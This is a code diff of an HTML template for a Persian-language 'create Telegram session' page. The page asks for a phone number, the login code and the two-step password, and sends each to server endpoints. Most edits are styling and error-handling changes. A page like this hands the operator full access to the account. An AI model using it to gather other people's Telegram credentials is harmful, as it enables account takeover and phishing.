@@ -412,6 +412,7 @@ FREE_HTML = """
 <head>
 <meta charset="UTF-8">
 <title>ساخت سشن تلگرام</title>
+
 <style>
 body {
     margin: 0;
@@ -422,20 +423,16 @@ body {
     width: 100vw;
 }
 
-/* پس‌زمینه ساده */
+/* پس‌زمینه */
 #galaxy {
     position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
+    inset: 0;
     background: url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;
     background-size: cover;
-    opacity: 99.25;
     z-index: -1;
 }
 
-/* فرم ورود */
+/* باکس اصلی */
 #container {
     position: absolute;
     top: 45%;
@@ -446,7 +443,7 @@ body {
     background: rgba(0,0,0,0.55);
     border-radius: 20px;
     border: 1px solid rgba(255,255,255,0.15);
-    backdrop-filter: blur(5px);
+    backdrop-filter: blur(6px);
     text-align: center;
 }
 
@@ -457,7 +454,7 @@ input {
     border-radius: 10px;
     border: none;
     outline: none;
-    font-size: 18px;
+    font-size: 17px;
 }
 
 button {
@@ -467,14 +464,21 @@ button {
     background: #5e5ef7;
     border: none;
     border-radius: 10px;
-    font-size: 20px;
+    font-size: 19px;
     color: white;
     cursor: pointer;
 }
 
-h2 { margin-top: 0; }
+button:hover {
+    background: #4a4ae0;
+}
+
+h2 {
+    margin-top: 0;
+}
 </style>
 </head>
+
 <body>
 
 <div id="galaxy"></div>
@@ -482,59 +486,86 @@ h2 { margin-top: 0; }
 <div id="container">
     <h2>ساخت سشن تلگرام</h2>
 
+    <!-- مرحله شماره -->
     <div id="step1">
-        <input id="phone" type="text" placeholder="شماره موبایل"/>
+        <input id="phone" type="text" placeholder="شماره موبایل">
         <button onclick="sendPhone()">ارسال کد</button>
     </div>
 
+    <!-- مرحله کد -->
     <div id="step2" style="display:none;">
-        <input id="code" type="text" placeholder="کد OTP"/>
-        <button onclick="sendCode()">تأیید</button>
+        <input id="code" type="text" placeholder="کد تأیید">
+        <button onclick="sendCode()">تأیید کد</button>
     </div>
 
+    <!-- مرحله رمز دوم -->
     <div id="step3" style="display:none;">
-        <input id="password" type="password" placeholder="رمز دو مرحله‌ای"/>
-        <button onclick="sendPassword()">تأیید</button>
+        <input id="password" type="password" placeholder="رمز دو مرحله‌ای">
+        <button onclick="sendPassword()">تأیید رمز</button>
     </div>
 
+    <!-- نتیجه -->
     <div id="result" style="display:none;">
-        <h3>سشن ساخته شد</h3>
-        <p id="msg">سشن شما با موفقیت ساخته شد!</p>
+        <h3>✅ سشن ساخته شد</h3>
+        <p>سشن شما با موفقیت ساخته شد.</p>
     </div>
 </div>
 
 <script>
 let phone_global = "";
 
+/* ارسال شماره */
 function sendPhone() {
     const phone = document.getElementById("phone").value.trim();
-    if(!phone){ alert("شماره موبایل را وارد کنید"); return; }
+    if (!phone) {
+        alert("شماره موبایل را وارد کنید");
+        return;
+    }
+
     phone_global = phone;
 
     fetch("/send_phone", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ phone: phone })
+        body: JSON.stringify({ phone })
     })
-    .then(r => r.json())
+    .then(async res => {
+        try {
+            return await res.json();
+        } catch {
+            return {}; // اگر پاسخ JSON نبود ولی درخواست انجام شد
+        }
+    })
     .then(data => {
-        if(data.status === "ok" || data.status === "sent" || data.status === "success"){
-    document.getElementById("step1").style.display = "none";
-    document.getElementById("step2").style.display = "block";
-} else {
-    alert(data.message || "خطا در ارسال کد");
-}
+        if (data.error) {
+            alert(data.message || "خطا در ارسال کد");
+            return;
+        }
+
+        // ارسال موفق (حتی اگر status نداشت)
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+    })
+    .catch(() => {
+        alert("خطای ارتباط با سرور");
     });
 }
 
+/* ارسال کد */
 function sendCode() {
     const code = document.getElementById("code").value.trim();
-    if(!code){ alert("کد OTP را وارد کنید"); return; }
+    if (!code) {
+        alert("کد تأیید را وارد کنید");
+        return;
+    }
 
     fetch("/send_code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ phone: phone_global, code: code })
+        body: JSON.stringify({
+            phone: phone_global,
+            code: code
+        })
     })
     .then(r => r.json())
     .then(data => {
@@ -546,28 +577,42 @@ function sendCode() {
         } else {
             alert(data.message || "کد اشتباه است");
         }
+    })
+    .catch(() => {
+        alert("خطا در بررسی کد");
     });
 }
 
+/* ارسال رمز دو مرحله‌ای */
 function sendPassword() {
-    const pass = document.getElementById("password").value.trim();
-    if(!pass){ alert("رمز دو مرحله‌ای را وارد کنید"); return; }
+    const password = document.getElementById("password").value.trim();
+    if (!password) {
+        alert("رمز دو مرحله‌ای را وارد کنید");
+        return;
+    }
 
     fetch("/send_password", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ phone: phone_global, password: pass })
+        body: JSON.stringify({
+            phone: phone_global,
+            password: password
+        })
     })
     .then(r => r.json())
     .then(data => {
         if (data.status === "ok") {
             success();
         } else {
-            alert(data.message || "خطا در رمز دوم");
+            alert(data.message || "رمز اشتباه است");
         }
+    })
+    .catch(() => {
+        alert("خطا در ارسال رمز");
     });
 }
 
+/* موفقیت نهایی */
 function success() {
     document.getElementById("step1").style.display = "none";
     document.getElementById("step2").style.display = "none";
